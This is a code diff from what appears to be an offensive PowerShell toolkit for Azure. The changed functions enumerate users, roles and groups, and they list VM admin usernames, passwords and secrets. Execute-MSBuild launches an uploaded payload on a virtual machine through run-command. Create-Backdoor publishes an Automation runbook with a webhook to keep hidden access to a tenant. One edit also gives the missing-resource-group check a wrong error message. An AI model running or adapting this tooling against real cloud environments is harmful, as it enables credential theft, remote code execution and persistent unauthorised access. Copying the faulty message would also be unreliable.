@@ -261,7 +261,7 @@ function Get-User
     else
     {
         $Id = az ad user list --query "[?userPrincipalName=='$User'].{Id:objectId}" -o tsv
-        $Username = az ad user list --upn $User --query '[].{UPN:userPrincipalName,ObjectType:objectType,DN:onPremisesDistinguishedName,UserType:userType,Enabled:accountEnabled}' -o yaml
+        $Username = az ad user list --upn $User --query '[].{UPN:userPrincipalName,Id:objectId,DN:onPremisesDistinguishedName,Enabled:accountEnabled}' -o yaml
         $Name = az ad user list --display-name $User --query '[].{UPN:userPrincipalName}' -o tsv
         $Roles = az role assignment list --all --query "[?principalName=='$User'].{Role:roleDefinitionName}" -o yaml
         $Groups = az ad user get-member-groups --id $Id -o yaml
@@ -1327,13 +1327,13 @@ function Get-VMDisk
      [Parameter(Mandatory=$false)][String]$ResourceGroup = $null)
     if($DiskName -eq "")
      {
-        Write-Host "Requires Disk name" -ForegroundColor Red
+        Write-Host "Requires Disk name, not a VM name." -ForegroundColor Red
         Write-Host "Usage: Get-VMDisk -DiskName AzureWin10_OsDisk_1_c2c7da5a0838404c84a70d6ec097ebf5 -ResourceGroup TestGroup" -ForegroundColor Red
 
      }
      elseif($ResourceGroup -eq "")
      {
-        Write-Host "Requires Resource Group name" -ForegroundColor Red
+        Write-Host "Requires Disk name, not a VM name." -ForegroundColor Red
         Write-Host "Usage: Get-VMDisk -DiskName AzureWin10_OsDisk_1_c2c7da5a0838404c84a70d6ec097ebf5 -ResourceGroup TestGroup" -ForegroundColor Red
      }
      else
@@ -1346,7 +1346,13 @@ function Get-VMDisk
 
 function Get-VMs
 {
+<#
+.SYNOPSIS
+    Lists all virtual machines available, their disks, and their IPs..
+#>
     az vm list --query '[].{Name:name,AdminUserName:osProfile.adminUsername,AdminPassword:osProfile.adminPassword,Id:vmId,Secrets:secrets}' -o table
+    Write-Host ""
+    az disk list --query '[].{Name:name,OS:osType,ResourceGroup:resourceGroup,SizeGB:diskSizeGb}' -o Table
     Write-Host ""
     az vm list-ip-addresses -o table
     Write-Host ""
@@ -1742,14 +1748,14 @@ function Execute-MSBuild
                 $split = $regex.Split("\\,:")
                 $name = $split[2]
                 $path = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.3\Downloads\$name"
-                $result = az vm run-command invoke -g $ResourceGroup -n $VM --command-id RunPowerShellScript -o yaml --scripts "Start-Process $path" | Out-Null
-                if($result -match "Provisioning succeeded")
+                $results = az vm run-command invoke -g $ResourceGroup -n $VM --command-id RunPowerShellScript -o yaml --scripts "Start-Process $path"
+                if($results -match "Provisioning succeeded")
                 {
                     Write-Host "MSBuild launched successfully, hopefully the payload is good!"
                 }
                 else
                 {
-                    $resut
+                    $results
                 }  
       }    
 
@@ -1843,32 +1849,32 @@ function Create-Backdoor
      if($ResourceGroup -eq "")
      {
         Write-Host "Requires Resource Group name" -ForegroundColor Red
-        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -Account AutomationAccountExample -Group ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
+        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -Account AutomationAccountExample -ResourceGroup ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
      }
      elseif($Account -eq "")
      {
         Write-Host "Requires an Automation Account name" -ForegroundColor Red
-        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -Account AutomationAccountExample -Group ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
+        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -Account AutomationAccountExample -ResourceGroup ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
      }
      elseif($Username -eq "")
      {
         Write-Host "Requires an Administrative username" -ForegroundColor Red
-        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -Account AutomationAccountExample -Group ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
+        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -Account AutomationAccountExample -ResourceGroup ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
      }
      elseif($Password -eq "")
      {
         Write-Host "Requires an Administrative password" -ForegroundColor Red
-        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -Account AutomationAccountExample -Group ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
+        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -Account AutomationAccountExample -ResourceGroup ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
      }
      elseif($NewUsername -eq "")
      {
         Write-Host "Requires a new username" -ForegroundColor Red
-        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -Account AutomationAccountExample -Group ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
+        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -Account AutomationAccountExample -ResourceGroup ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
      }
      elseif($NewPassword -eq "")
      {
         Write-Host "Requires a new password." -ForegroundColor Red
-        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -Account AutomationAccountExample -Group ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
+        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -Account AutomationAccountExample -ResourceGroup ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
      }
      else
      {
@@ -1891,7 +1897,7 @@ function Create-Backdoor
                 Publish-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $Account -Name AzureAutomationTutorialPowerShell
                 Write-Host ""
                 Write-Host "--------------------"
-                Write-Host "COPY THIS URI, IT IS NOT RETRIEVABLE. PASS IT INTO Execute-BackDoor TO RUN IT"
+                Write-Host "COPY THE URI BELOW, IT IS NOT RETRIEVABLE. PASS IT INTO Execute-BackDoor TO RUN IT"
                 New-AzAutomationWebhook -Name "AzureAutomationTutorialPowerShell" -ResourceGroup $ResourceGroup -AutomationAccountName $Account -RunbookName "AzureAutomationTutorialPowerShell" -Force -IsEnabled $True -ExpiryTime $formatted
                 rm AzureAutomationTutorialPowerShell.ps1
             }
